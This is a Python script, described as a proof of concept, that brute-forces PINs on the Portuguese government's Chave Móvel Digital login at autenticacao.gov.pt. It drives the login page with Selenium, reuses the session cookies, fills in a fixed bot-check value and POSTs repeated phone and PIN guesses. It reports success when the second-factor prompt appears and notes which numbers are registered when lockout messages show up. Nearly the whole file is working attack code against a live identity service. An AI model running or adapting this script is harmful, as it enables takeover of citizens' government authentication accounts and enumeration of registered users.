"""
A simple Proof Of Concept script that bruteforces the logins
on the https://autenticacao.gov.pt Chave Móvel Digial (Digital Mobile Key)
login.
"""

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import requests
from bs4 import BeautifulSoup

def go_to_login_page(driver):
    driver.get('https://frtend.reg.cmd.autenticacao.gov.pt/Ama.Registry.Frontend/Processes/RegistryOnline/LoginOnline.aspx')

    dmk_tab = driver.find_element_by_id('ctl00_MainContent_tabCMD')
    dmk_tab.click()

    dmk_auth_btn = driver.find_element_by_id('ctl00_MainContent_Button2')
    dmk_auth_btn.click()

def get_requests_session_obj_from_driver(driver):
    session = requests.Session()
    for cookie in driver.get_cookies():
        session.cookies.set(cookie['name'], cookie['value'])
    return session

def attempt_login(session, data, phone, pin):
    POST_URL = 'https://cmd.autenticacao.gov.pt/Ama.Authentication.Frontend/Processes/Authentication/MobileAuthentication.aspx'

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host':'cmd.autenticacao.gov.pt',
        'Origin':'https://cmd.autenticacao.gov.pt',
        'Referer':'https://cmd.autenticacao.gov.pt/Ama.Authentication.Frontend/Processes/Authentication/MobileAuthentication.aspx',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'

    }
    res = session.post(POST_URL, data=data, headers=headers)
    return res

def attempt_login_webdriver(driver, phone, pin):
    hidden_mobile_number_elem = driver.find_element_by_id('MainContent_hiddenMobile')
    pin_field = driver.find_element_by_id('MainContent_txtPin')

def get_attr_value_from_elem_id(bs, elem_id, attr_name):
    elem = bs.find(id=elem_id)
    elem_value = elem.get(attr_name)
    return elem_value

def parse_form_data_from_HTML(html, phone, pin):
    bs = BeautifulSoup(html, 'html.parser')

    human_check = '8FBB298A-DE46-4657-88E8-95F1F1224784'
    event_target = get_attr_value_from_elem_id(bs, '__EVENTTARGET', 'value')
    event_argument = get_attr_value_from_elem_id(bs, '__EVENTARGUMENT', 'value')
    view_state = get_attr_value_from_elem_id(bs, '__VIEWSTATE', 'value')
    event_validation = get_attr_value_from_elem_id(bs, '__EVENTVALIDATION', 'value')

    data = {
        '__EVENTTARGET': event_target,
        '__EVENTARGUMENT': event_argument,
        '__VIEWSTATE': view_state,
        '__EVENTVALIDATION': event_validation,
        'ctl00$MainContent$hiddenMobile': phone,
        'humanCheck': human_check,
        'inputMobile': phone,
        'ctl00$MainContent$txtPin': pin,
        'ctl00$MainContent$btnNext': 'Autenticar',
    }

    return data

def is_pin_valid(html):
    WRONG_PIN_TEXT = 'O número de telemóvel ou o PIN estão errados ou registo inexistente'
    bs = BeautifulSoup(html, 'html.parser')

    elem = bs.find(id='MainContent_lblMsgError')

    if elem.text == WRONG_PIN_TEXT:
        print('\tWRONG PIN')
        return False
    elif bs.find(id='MainContent_txtMobileTAN') is not None:
        # Second factor auth box found, PIN has been succesfully guessed
        print('\t***SUCCESS***')
        return True
    elif elem.text.startswith('A sua conta encontra-se temporariamente bloqueada'):
        print('This phone number is registered!')
        import pdb; pdb.set_trace()
    else:
        # TODO: your session might've been timed out, all you have to do
        # is return the remanining PIN attempts list and re-do the
        # authentication chain with the driver
        # I'll do this when I have time
        # RAISE an exception here
        import pdb; pdb.set_trace()
        pass

def bruteforce_login(driver, phone_number, pin_list):

    num_pins = len(pin_list)
    num_attempts = 0

    session = get_requests_session_obj_from_driver(driver)

    first_pin = pin_list[0]
    pin_list = pin_list[1:]

    num_attempts += 1
    print('Trying: {}:{} [{}/{}]'.format(phone_number, first_pin, num_attempts, num_pins))

    data = parse_form_data_from_HTML(driver.page_source, phone_number, first_pin)
    res = attempt_login(session, data, phone_number, first_pin)

    if (is_pin_valid(res.content)):
        return True

    for pin in pin_list:
        num_attempts += 1
        print('Trying: {}:{} [{}/{}]'.format(phone_number, pin, num_attempts, num_pins))

        data = parse_form_data_from_HTML(res.content, phone_number, pin)
        #import pdb; pdb.set_trace()
        res = attempt_login(session, data, phone_number, pin)

        if is_pin_valid(res.content):
            return True

    print('FAILED to find PIN')
    return False

driver = webdriver.Chrome()
driver.implicitly_wait(10)

go_to_login_page(driver)

phone_number = '+351 910000000'
pin_list = ['1992', '2005', '2001']*999

bruteforce_login(driver, phone_number, pin_list)

driver.close()
